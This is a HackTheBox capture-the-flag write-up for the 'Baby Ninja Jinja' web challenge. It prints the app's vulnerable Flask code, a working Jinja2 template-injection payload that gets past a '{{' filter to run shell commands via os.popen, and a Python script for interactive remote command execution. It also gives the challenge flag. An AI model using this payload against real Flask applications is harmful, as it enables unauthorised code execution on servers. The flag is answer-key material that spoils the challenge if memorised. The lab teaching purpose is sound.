---
description: Baby Ninja Jinja challenge from HackTheBox write up.
password: HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}
---

# Baby Ninja Jinja

## Initial enumeration

The page shows a little box to enter your "ninja" name and after that it just ask you to wait for approval. Using Gobuster, we can find two new locations in the site: `/console` and `/debug`. The first one is a Python console that asks for a password we don't have and the second shows the application code.

## Checking the code

Looking around it is obvious that the page is vulnerable to SSTI, what is awesome to get potencial RCE (It is also vulnerable to SQL injection but I will focus in the SSTI):

```python
def born2pwn(*args, **kwargs):

    name = request.args.get('name', '')

    if name:
        query_db('INSERT INTO ninjas (name) VALUES ("%s")' % name)

        report = render_template_string(acc_tmpl.
            replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).
            replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())
        )

        if session.get('leader'): 
            return report

        return render_template('welcome.jinja2')
    return func(*args, **kwargs)
```

As we can see, after inserting our input in the database, it would just take it back and use it to render a template without sanitizing the content we control. Just one thing, the database is filtering some characters and expressions:

```python
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/ninjas.db')
        db.isolation_level = None
        db.row_factory = sqlite3.Row
        db.text_factory = (lambda s: s.replace('{{', '').
            replace("'", '&#x27;').
            replace('"', '&quot;').
            replace('<', '&lt;').
            replace('>', '&gt;')
        )
    return db
```

So, we can't use `{{` for our SSTI. Using `{%` in the input field will throw a syntax error but using `{{` will just work as any other input. Also, make sure to not use `'`, `"`, `<` or `>` because the application is encoding them and won't work as expected in the payloads.

Looking at the `born2pwn` function a bit more, looks like if a cookie session exists with a key named `leader`, the application will show the page for an authenticated user. This could be cool because the page would print our payload as our name (Executing our template code), but since we have to use statements with the `{%  %}` delimiters, we can't really print anything to the page.

## Exploiting the SSTI

Right now we can't see the output of our RCE what makes hard to know if we are really executing something. We can dump the RCE output into the session cookie and then decode it to check the result.

The payload to execute the `id` command would be:
```bash
<URL>?name={% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&key=leader&command=id
```
You can see that to avoid using strings, the payload adds some GET parameters to be able to set the dictionary key and the command to execute.

After requesting the page with the payload, we can get the session cookie and decode it with `flask-unsign` to check our RCE output:
```bash
┌──(kali㉿kali)-[~]
└─$ flask-unsign --decode --cookie '.eJyrVspJTUxJLVKyqlZSSFKyUkoJz8kOCIk09AvxNfB2Ny2LzLXMTg3OTo8ywirurVRbCwDoPBX1.YaKRYA.KYAop-Z0Z7-YE86IhrjIfW8DMNo'
{'leader': b'uid=65534(nobody) gid=65534(nobody)\n'}
```

### Getting the flag

To make the process of executing commands easier I wrote a little Python script:
```python
#! /usr/bin/env python3

import requests
import flask_unsign


url = '<URL>/?name={% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&key=leader&command='

command = ''
while(command != 'exit'):
	command = input ('Command to inject: ')
	response = requests.get(f'{url}{command}')
	if(response.ok):
		encoded_cookie = response.cookies['session']
		decoded_cookie = flask_unsign.decode(encoded_cookie)
		command_output = decoded_cookie['leader'].decode()
		print(command_output)
```

```bash
┌──(kali㉿kali)-[~/Documents/HTB/baby ninja jinja]
└─$ ./rce.py
Command to inject: ls
app.py
flag_P54ed
schema.sql
static
templates

Command to inject: cat flag_P54ed
HTB{***}

Command to inject:
```

I tried to get a reverse shell but looks like something is blocking the conections (Maybe is just me being silly).
